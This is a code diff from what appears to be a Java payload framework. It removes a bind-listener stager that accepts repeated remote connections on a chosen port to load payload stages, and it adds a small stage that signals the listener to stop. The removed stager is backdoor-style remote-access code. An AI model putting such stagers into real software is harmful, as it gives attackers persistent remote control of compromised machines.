@@ -32,38 +32,23 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.stager;
+package javapayload.stage;
 
-import java.net.ServerSocket;
-import java.net.Socket;
+import java.io.BufferedReader;
+import java.io.DataInputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.PrintStream;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.net.URL;
+import java.util.Enumeration;
 
-public class BindMultiTCP extends Stager implements Runnable {
+public class StopListening implements Stage {
 
-	private Socket s;
-	private String[] parameters; 
-	
-	private Runnable init(Socket s, String[] parameters) {
-		this.s = s;
-		this.parameters=parameters;	
-		return this;
-	}
-	
-	public void bootstrap(String[] parameters) throws Exception {
-		final ServerSocket ss = new ServerSocket(Integer.parseInt(parameters[2]));
-		while (true) {
-			final Socket s = ss.accept();
-			new Thread(new BindMultiTCP().init(s, parameters)).start();
-			if (parameters != null && parameters.length > 0 && parameters[0].equals("-STOP-"))
-				break;
-		}
-		ss.close();
-	}
-	
-	public void run() {
-		try {
-			bootstrap(s.getInputStream(), s.getOutputStream(), parameters);
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
+	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+		parameters[0] = "-STOP-";
+		out.close();
 	}
 }
+
